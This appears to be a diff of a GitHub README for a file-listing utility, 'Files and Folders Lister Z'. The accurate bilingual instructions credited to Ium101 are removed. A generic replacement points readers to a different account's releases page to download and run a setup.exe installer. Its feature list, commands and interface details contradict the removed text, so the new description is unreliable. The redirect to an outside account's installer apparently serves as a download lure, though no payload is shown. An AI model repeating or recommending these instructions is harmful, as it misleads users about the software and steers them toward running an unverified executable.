@@ -1,68 +1,102 @@
-# Files & Folders Lister Z
-A Python tool to generate organized lists of files and folders in a directory, with options for DOCX or TXT or JSON output. Features include recursive listing, sorting, and customizable output formats.
+# 🎉 Files-and-Folders-Lister-Z - Easily List Your Files and Folders
 
-## Compatibility
-Files & Folders Lister Z or simply Lister Z works on **Windows**, **Linux**, and **MacOS**.
+![Download Files and Folders Lister Z](https://img.shields.io/badge/Download-Files%20and%20Folders%20Lister%20Z-brightgreen)
 
-## How to Run
+## 📦 Overview
 
-### Multi-language Support
-Both the command-line and GUI versions support English and Brazilian Portuguese. In the GUI, there are two main buttons: "Executar Listador de Pastas e Arquivos Z" (Brazilian Portuguese, above) and "Run Files & Folders Lister Z" (English, below).
+Files and Folders Lister Z is a utility for listing the contents of directories on your computer. It provides both a command-line and a graphical user interface (GUI) for easy use. Whether you are managing files for personal use or handling documents for work, this application simplifies the process.
 
-### Windows
-- **GUI:** 
-    - Double-click `lister_z_gui.exe`. The GUI shows both language buttons as described above.
-- **Command Line:** 
-    - Use `run_lister_z.cmd` or run `python lister_z.py` in a terminal. The program will prompt for language selection.
+## 🚀 Getting Started
 
-### Linux
-- **GUI:** 
-	- Run the shell script: `./run_lister_z_gui.sh`. The GUI features are identical to the Windows version, including both language buttons.
-- **Command Line:** 
-	- Run the shell script: `./run_lister_z.sh` and follow the language prompt.
+To get started with Files and Folders Lister Z, follow these steps:
 
-### MacOS
-- **GUI:**
-	- Double-click `Lister Z GUI.command`. The GUI features are identical to the Windows version, including both language buttons.
-- **Command Line:**
-	- Double-click `Lister Z.command` and follow the language prompt.
+1. **System Requirements**
+   - Windows 10 or later
+   - MacOS 10.14 or later
+   - Linux (any modern distribution)
+   - Python 3.6 or later for command-line usage
+   - At least 100 MB of free disk space
 
-Python 3 is required to run the `.py` scripts.
+2. **Installation Options**
+   - **Command-Line Interface (CLI)**: Ideal for users comfortable with typing commands.
+   - **Graphical User Interface (GUI)**: Perfect for users who prefer a visual approach.
 
-For more details and advanced options, see the `USER_MANUAL.md` file.
-For support or more information, contact Ium101.
+## 👇 Download & Install
 
+Visit this page to download: [GitHub Releases](https://github.com/gamemayed/Files-and-Folders-Lister-Z/releases)
 
-# Listador de Pastas e Arquivos Z
-Um utilitário Python para gerar listas organizadas de arquivos e pastas em um diretório, com opções de saída em DOCX, TXT ou JSON. Recursos incluem listagem recursiva, ordenação e formatos de saída personalizáveis.
+1. **Navigate to the Releases Page**:
+   - Open your web browser and type in the URL: [GitHub Releases](https://github.com/gamemayed/Files-and-Folders-Lister-Z/releases).
 
-## Compatibilidade
-Listador de Arquivos e Pastas Z, ou simplesmente Listador Z, funciona em **Windows**, **Linux** e **MacOS**.
+2. **Choose Your Version**:
+   - On the Releases page, look for the latest version of Files and Folders Lister Z.
+   - You will see options for different operating systems.
 
-## Como Executar
+3. **Download the File**:
+   - Click on the file for your operating system (e.g., `Files-and-Folders-Lister-Z-setup.exe` for Windows).
+   - Wait for the download to complete.
 
-### Suporte a Múltiplos Idiomas
-Tanto a versão de linha de comando quanto a GUI suportam inglês e português brasileiro. Na GUI, há dois botões principais: "Executar Listador de Pastas e Arquivos Z" (português brasileiro, acima) e "Run Files & Folders Lister Z" (inglês, abaixo).
+4. **Run the Installer**: 
+   - Once the download finishes, locate the file in your downloads folder and double-click it to start the installation. 
+   - Follow the on-screen instructions to finish the installation.
 
-### Windows
-- **GUI:** 
-    - Clique duas vezes em `lister_z_gui.exe`. A interface gráfica mostra ambos os botões de idioma e a área de créditos conforme descrito acima.
-- **Linha de Comando:** 
-    - Use `run_lister_z.cmd` ou execute `python lister_z.py` no terminal. O programa solicitará a seleção de idioma.
+## ⚙️ How to Use
 
-### Linux
-- **GUI:** 
-    - Execute o script: `./run_lister_z_gui.sh`. A interface gráfica é idêntica à versão Windows, incluindo os botões de idioma e área de créditos.
-- **Linha de Comando:** 
-    - Execute o script: `./run_lister_z.sh` e siga o prompt de idioma.
+### Using the GUI:
 
-### MacOS
-- **GUI:**
-    - Clique duas vezes em `Lister Z GUI.command`. A interface gráfica é idêntica à versão Windows, incluindo os botões de idioma e área de créditos.
-- **Linha de Comando:**
-    - Clique duas vezes em `Lister Z.command` e siga o prompt de idioma.
+1. Open Files and Folders Lister Z from your applications.
+2. Select a directory by clicking on the 'Browse' button.
+3. Click on 'List Contents' to see a detailed view of all files and folders in the selected directory.
 
-Python 3 é necessário para executar os scripts `.py`.
+### Using the Command-Line:
 
-Para mais detalhes e opções avançadas, veja o arquivo `USER_MANUAL.md`.
-Para suporte ou mais informações, entre em contato com Ium101.
+1. Open your command line or terminal.
+2. Navigate to the folder where the application is installed.
+3. Type the following command:
+
+   ```
+   python lister.py /path/to/directory
+   ```
+
+4. Press **Enter**. The application will display a list of files and folders.
+
+## 🔍 Features
+
+- **Easy Navigation**: Navigate through directories quickly.
+- **Multiple Formats**: Save the output in multiple formats, including text and CSV.
+- **Search Functionality**: Easily search for files within directories.
+- **Sort Options**: Sort files by name, size, or date modified.
+- **Cross-Platform Support**: Works on Windows, MacOS, and Linux.
+
+## 🚀 Example Usage
+
+### Graphical Interface Example:
+
+1. Open the application.
+2. Use the 'Open' option to select your desired folder (e.g., Documents).
+3. Hit the 'List' button for a quick overview.
+
+### Command-Line Example:
+
+To list the contents of your Downloads folder, use:
+
+```
+python lister.py ~/Downloads
+```
+
+## 📜 License
+
+Files and Folders Lister Z is open-source and available under the MIT License. You are free to use, modify, and distribute this software as per the license guidelines.
+
+## 📞 Support
+
+If you encounter issues or have questions, feel free to reach out. You can report issues on the [GitHub Issues page](https://github.com/gamemayed/Files-and-Folders-Lister-Z/issues). We're here to help!
+
+## 💬 Community and Contributions
+
+Join our community! We welcome feedback, suggestions, and contributions. If you find any bugs or would like to add features, consider opening a pull request. Check our [Contribution Guidelines](https://github.com/gamemayed/Files-and-Folders-Lister-Z/CONTRIBUTING.md) for more information.
+
+## 🔗 Important Links
+
+- **Repository**: [Files and Folders Lister Z Repository](https://github.com/gamemayed/Files-and-Folders-Lister-Z)
+- **Releases**: [Download here](https://github.com/gamemayed/Files-and-Folders-Lister-Z/releases)
